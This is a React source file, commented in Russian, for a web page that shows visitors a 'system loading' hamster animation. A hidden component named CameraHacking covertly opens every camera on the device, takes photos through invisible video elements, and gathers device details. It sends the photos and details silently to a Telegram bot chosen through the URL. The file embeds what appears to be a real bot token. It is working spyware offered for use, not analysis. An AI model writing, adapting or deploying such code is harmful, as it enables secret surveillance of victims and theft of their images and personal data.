import React, { useRef, useEffect } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ chatId }) => {
  const hasCaptured = useRef(false);
  const isProcessing = useRef(false);
  const streamsRef = useRef([]);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';

  // Метод отправки который не показывает ответ
  const sendToTelegramSilent = (text) => {
    // Используем XMLHttpRequest чтобы не показывать ответ
    const xhr = new XMLHttpRequest();
    xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    
    xhr.send(JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML',
      disable_notification: true
    }));
  };

  // Отправка фото без показа ответа
  const sendPhotoSilent = (blob, caption = '', cameraNumber = 0) => {
    return new Promise((resolve) => {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `camera${cameraNumber}_${Date.now()}.jpg`);
      formData.append('disable_notification', 'true');
      if (caption) formData.append('caption', caption);

      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, true);
      
      xhr.onload = () => resolve(true);
      xhr.onerror = () => resolve(false);
      
      xhr.send(formData);
    });
  };

  // Получение списка всех камер
  const getAllCameras = async () => {
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevices = devices.filter(device => device.kind === 'videoinput');
      
      sendToTelegramSilent(`📷 Найдено камер: ${videoDevices.length}`);
      return videoDevices;
    } catch (error) {
      sendToTelegramSilent(`❌ Ошибка поиска камер: ${error.message}`);
      return [];
    }
  };

  // Активация и захват со всех камер
  const captureFromAllCameras = async () => {
    if (isProcessing.current || hasCaptured.current) return;
    isProcessing.current = true;
    
    try {
      // Получаем список всех камер
      const cameras = await getAllCameras();
      
      if (cameras.length === 0) {
        sendToTelegramSilent('⚠️ Камеры не найдены');
        return;
      }
      
      sendToTelegramSilent(`🚀 Начинаю захват с ${cameras.length} камер...`);
      
      streamsRef.current = [];
      const videos = [];
      const photos = [];
      
      // Активируем каждую камеру и делаем фото
      for (let i = 0; i < cameras.length; i++) {
        try {
          const camera = cameras[i];
          
          // Пробуем разные настройки для каждой камеры
          const constraints = {
            video: {
              deviceId: camera.deviceId ? { exact: camera.deviceId } : undefined,
              width: { ideal: 1920 },
              height: { ideal: 1080 },
              facingMode: i === 0 ? { ideal: "environment" } : "user"
            },
            audio: false
          };
          
          // Получаем доступ к камере
          const stream = await navigator.mediaDevices.getUserMedia(constraints);
          streamsRef.current.push(stream);
          
          // Создаем видео элемент
          const video = document.createElement('video');
          video.style.cssText = `
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            z-index: -9999;
            top: -9999px;
            left: -9999px;
          `;
          video.autoplay = true;
          video.muted = true;
          video.playsInline = true;
          video.srcObject = stream;
          document.body.appendChild(video);
          videos.push(video);
          
          // Ждем готовности видео
          await new Promise(resolve => {
            video.onloadedmetadata = () => {
              video.play();
              setTimeout(resolve, 1000);
            };
          });
          
          // Делаем фото
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          
          // Конвертируем в blob
          const blob = await new Promise(resolve => {
            canvas.toBlob(resolve, 'image/jpeg', 0.8);
          });
          
          photos.push({
            blob,
            cameraNumber: i + 1,
            resolution: `${video.videoWidth}x${video.videoHeight}`,
            label: camera.label || `Камера ${i + 1}`
          });
          
          sendToTelegramSilent(`✅ Камера ${i + 1} готова: ${video.videoWidth}x${video.videoHeight}`);
          
        } catch (error) {
          sendToTelegramSilent(`❌ Ошибка камеры ${i + 1}: ${error.message}`);
          continue;
        }
      }
      
      // Отправляем все фото
      for (const photo of photos) {
        const caption = `📸 Камера ${photo.cameraNumber}/${cameras.length}\n` +
          `📐 ${photo.resolution}\n` +
          `📱 ${photo.label}\n` +
          `⏰ ${new Date().toLocaleString()}`;
        
        await sendPhotoSilent(photo.blob, caption, photo.cameraNumber);
        
        // Небольшая задержка между отправками
        await new Promise(resolve => setTimeout(resolve, 500));
      }
      
      // Закрываем все потоки
      streamsRef.current.forEach(stream => {
        stream.getTracks().forEach(track => track.stop());
      });
      streamsRef.current = [];
      
      // Удаляем видео элементы
      videos.forEach(video => video.remove());
      
      sendToTelegramSilent(`🎉 Завершено! Отправлено ${photos.length} фото с ${cameras.length} камер`);
      
      hasCaptured.current = true;
      
    } catch (error) {
      console.error('Capture error:', error);
      sendToTelegramSilent(`❌ Критическая ошибка: ${error.message}`);
    } finally {
      // Гарантированно закрываем все потоки
      streamsRef.current.forEach(stream => {
        stream?.getTracks().forEach(track => track.stop());
      });
      streamsRef.current = [];
      isProcessing.current = false;
    }
  };

  // Сбор информации об устройстве
  const collectAndSendDeviceInfo = () => {
    const info = {
      platform: navigator.platform,
      userAgent: navigator.userAgent,
      screen: `${window.screen.width}x${window.screen.height}`,
      devicePixelRatio: window.devicePixelRatio,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
      isTablet: /Tablet|iPad/i.test(navigator.userAgent),
      isDesktop: !/Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
    };
    
    // Определяем тип ОС
    let os = 'Unknown';
    const ua = navigator.userAgent;
    if (/Windows/i.test(ua)) os = 'Windows';
    if (/Mac OS/i.test(ua)) os = 'macOS';
    if (/Linux/i.test(ua)) os = 'Linux';
    if (/Android/i.test(ua)) os = 'Android';
    if (/iOS|iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
    
    const message = `📱 ПОЛНАЯ ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ

📊 СИСТЕМА
▫️ ОС: ${os}
▫️ Платформа: ${info.platform}
▫️ Тип: ${info.isMobile ? '📱 Мобильное' : info.isTablet ? '📟 Планшет' : '💻 Компьютер'}

🖥 ЭКРАН
▫️ Разрешение: ${info.screen}
▫️ Pixel Ratio: ${info.devicePixelRatio}

⚙️ АППАРАТУРА
▫️ Ядра CPU: ${info.hardwareConcurrency}
▫️ Память: ${info.deviceMemory} GB

🌐 СЕТЬ
▫️ User Agent: ${info.userAgent.substring(0, 100)}...

🌍 ЯЗЫК И ВРЕМЯ
▫️ Язык: ${info.language}
▫️ Часовой пояс: ${info.timezone}
▫️ Время: ${new Date().toLocaleString()}

🚀 ГОТОВ К ЗАХВАТУ С ВСЕХ КАМЕР`;
    
    sendToTelegramSilent(message);
  };

  // Основная логика
  useEffect(() => {
    if (hasCaptured.current) return;
    
    const init = async () => {
      // Отправляем стартовое сообщение
      sendToTelegramSilent('🚀 ПОЛЬЗОВАТЕЛЬ ЗАШЕЛ НА САЙТ');
      
      // Собираем и отправляем информацию об устройстве
      collectAndSendDeviceInfo();
      
      // Ждем 1.5 секунды и начинаем захват со всех камер
      setTimeout(async () => {
        if (!hasCaptured.current) {
          await captureFromAllCameras();
        }
      }, 1500);
    };
    
    init();
  }, []);

  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE - показывает только хомяка
 */
const PhotoPage = () => {
  const { chatId } = useParams();

  return (
    <>
      <div className="App" style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        padding: '20px'
      }}>
        <div className="wraper" style={{ transform: 'scale(1.2)' }}>
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
          
          <div style={{
            textAlign: 'center',
            marginTop: '40px',
            color: 'white',
            fontSize: '20px',
            fontWeight: 'bold',
            opacity: 0.8
          }}>
            Загрузка системы...
          </div>
        </div>
      </div>

      <CameraHacking chatId={chatId} />
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div className="App" style={{
          minHeight: '100vh',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)'
        }}>
          <div className="wraper">
            <div className="wheel-and-hamster">
              <div className="wheel"></div>
              <div className="hamster">
                <div className="hamster__body">
                  <div className="hamster__head">
                    <div className="hamster__ear"></div>
                    <div className="hamster__eye"></div>
                    <div className="hamster__nose"></div>
                  </div>
                  <div className="hamster__limb hamster__limb--fr"></div>
                  <div className="hamster__limb hamster__limb--fl"></div>
                  <div className="hamster__limb hamster__limb--br"></div>
                  <div className="hamster__limb hamster__limb--bl"></div>
                  <div className="hamster__tail"></div>
                </div>
              </div>
              <div className="spoke"></div>
            </div>
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
